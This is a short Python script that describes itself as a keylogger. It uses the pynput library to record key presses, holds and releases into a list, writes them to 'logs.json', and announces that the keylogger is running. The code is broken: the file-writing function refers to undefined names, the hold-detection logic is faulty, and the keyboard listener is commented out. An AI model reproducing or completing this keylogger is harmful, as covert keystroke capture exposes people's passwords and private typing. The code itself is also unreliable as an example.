from pynput import keyboard
import json

key_list = []
x = False #Value to determine if held
key_strokes = ""

def update_json_file(key_list):
    with open('logs.json', 'w+') as key_strokes:
        #key_list_bytes = json.dumps(key_list).encode()
        key_stroke.write(key)#_list_bytes)

def on_press(key):
    global x, key_list
    if x == False:
        key_list.append(
            {'Pressed': f'{key}'}
            #f'Key {key} pressed'
        )
        x = True
    if x == True:
        key_list.append(
            {'Held': f'{key}'}
            #f'Key {key} pressed'
        )
        update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes
    key_list.append(
        {'Released': f'{key}'}
        #f'Key {key} released'
    )
    if x == True:
        x = False
    update_json_file(key_list)

print("[+] Running Keylogger successfuly!\n[!] Saving the key logs in 'logs.json'")

#with keyboard.Listener(
        #on_press = on_press,
        #on_release = on_release) as listener:
    #listener,join()

                
